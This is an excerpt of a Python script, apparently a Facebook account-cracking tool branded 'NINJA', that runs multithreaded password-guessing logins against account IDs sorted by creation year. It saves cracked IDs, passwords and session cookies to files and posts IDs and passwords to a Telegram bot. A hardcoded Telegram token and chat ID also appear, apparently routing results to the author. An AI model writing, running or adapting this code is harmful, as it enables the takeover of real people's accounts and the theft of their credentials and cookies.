...
ninja1=input('\033[1;34m (\033[1;31m♢\033[1;34m)\033[2;32m ID :   ')

ninja2=input('\033[1;34m (\033[1;31m♢\033[1;34m)\033[2;32mTOKEN  :  ')
a1 = '\x1b[1;31m'  # سور
a2 = '\x1b[1;34m'  # شین
a3 = '\x1b[1;32m'  # سەوز
a4 = '\x1b[1;33m'  # زەرد
...
def asha(idf):
    if len(idf)==15:
        if idf[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
        elif idf[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
        elif idf[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
        elif idf[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
        elif idf[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
        elif idf[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
        elif idf[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
        elif idf[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
        elif idf[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
        elif idf[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
        elif idf[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
        elif idf[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
        elif idf[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
        elif idf[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
        elif idf[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
        elif idf[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
        elif idf[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
        elif idf[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
        elif idf[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
        else:alif=''
...
print('\n')
token=('7103578755:AAGNZwBh-YnAgyo0D1Qb0EGCH-OIpZB7K9c')
print('\n')
ID=('6153134558')
cetak(nel('\t• Sedang Menginstall Modul Requests •'))
os.system('clear')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print(f'│ {h} ACC OK : {h}%s '%(ok))
	print(f'│ {k} ACC CP : {k}%s{x} '%(cp))
	#print('')
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r{x}[{h}NINJA{x}]{k} {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					requests.post(f"https://api.telegram.org/bot{ninja2}/sendMessage?chat_id={ninja1}&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 ‌CP \n➳ Email  :  : {idf} \n│   ⊛  PASS  : {pw}")
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/NINJA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/NINJA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					requests.post(f"https://api.telegram.org/bot{ninja2}/sendMessage?chat_id={ninja1}&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 OK \n➳ Email  :  : {idf} \n│   ⊛  PASS  : {pw}")
...
def cek_NIK(kuki):
 ...
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m              NINJA: %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 ...
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m              NINJA: %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 except AttributeError:
